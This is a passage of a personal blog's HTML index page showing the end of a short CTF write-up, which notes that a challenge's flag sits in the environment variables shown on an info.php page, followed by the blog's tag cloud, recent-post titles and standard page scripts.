<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113622381.png" alt="image-20250314113622338"></p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113633453.png" alt="image-20250314113633380"></p>
<p>看到有个info.php，访问他，flag在环境变量里</p>
<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113646833.png" alt="image-20250314113646777"></p>

	
	</div>
  <a type="button" href="/2025/03/12/www-zip文件泄露题目实战/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/Pwn/">Pwn<span>1</span></a></li>
		
			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
		
			<li><a href="/tags/基础/">基础<span>2</span></a></li>
		
			<li><a href="/tags/生活/">生活<span>1</span></a></li>
		
			<li><a href="/tags/WEB/">WEB<span>1</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2025/03/17/【面试】UDP通信原理/" ><i class="fa fa-file-o"></i>【面试】UDP通信原理</a>
      </li>
    
      <li>
        <a href="/2025/03/17/【面试】TCP通信原理/" ><i class="fa fa-file-o"></i>【面试】TCP通信原理</a>
      </li>
    
      <li>
        <a href="/2025/03/15/AWD-Pwn脚本汇总/" ><i class="fa fa-file-o"></i>AWD-Pwn脚本汇总</a>
      </li>
    
      <li>
        <a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" ><i class="fa fa-file-o"></i>【Pwn1】栈溢出+覆盖判断条件练习题</a>
      </li>
    
      <li>
        <a href="/2025/03/14/2025腾讯面试一面总结/" ><i class="fa fa-file-o"></i>2025腾讯面试一面总结</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="false"></i><a href="https://github.com/WMBa0" title="" target="_blank"]);">WMBa0个人博客</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 WMBa0 &#39;s Blog
  
      powered by <a href="https://github.com/WMBa0" target="_blank">WMBa0 Github</a>
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
